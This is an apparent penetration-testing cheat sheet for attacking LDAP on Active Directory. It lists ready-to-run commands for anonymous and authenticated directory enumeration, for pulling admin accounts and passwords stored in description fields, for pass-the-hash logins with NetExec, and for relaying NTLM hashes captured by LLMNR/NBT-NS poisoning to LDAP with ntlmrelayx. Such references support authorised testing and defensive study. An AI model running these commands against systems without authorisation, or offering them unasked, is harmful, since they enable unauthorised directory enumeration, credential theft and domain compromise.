# LDAP (389, 636)

!!! tip "Start here"
    Try anonymous bind first: `ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com"`. If it returns data you have unauthenticated enumeration of the entire directory — usernames, computers, group memberships, sometimes passwords in description fields.

---

## Enumeration

```bash
nmap -p 389,636 --script ldap-rootdse,ldap-search 10.10.10.10
nmap -n -sV --script "ldap* and not brute" 10.10.10.10
```

---

## Anonymous Bind

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "dc=example,dc=com"
```

---

## Authenticated Enumeration

```bash
# All users
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName

# All computers
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(objectClass=computer)" cn

# Admin accounts (adminCount=1)
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(&(objectClass=user)(adminCount=1))" sAMAccountName

# Domain Admins group membership
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com)" sAMAccountName

# Passwords stored in description fields
ldapsearch -x -H ldap://10.10.10.10 -D 'user@example.com' -w '<pass>' \
  -b "dc=example,dc=com" "(description=*)" sAMAccountName description
```

---

## CrackMapExec

```bash
nxc ldap 10.10.10.10 -u <user> -p <pass> --users
nxc ldap 10.10.10.10 -u <user> -H <hash>
```

---

## NTLM Relay to LDAP

If you capture NTLMv2 hashes via LLMNR/NBT-NS poisoning, relay them to LDAP:

```bash
ntlmrelayx.py -t ldap://10.10.10.10 --dump
```

!!! tip "Real-world"
    Anonymous LDAP is still common on internal AD environments — it's rarely intentional, usually a misconfiguration from legacy requirements. Even with credentials, `description` fields are a reliable place to find passwords that sysadmins embedded years ago. Pull the full dump and grep it offline rather than running targeted queries.
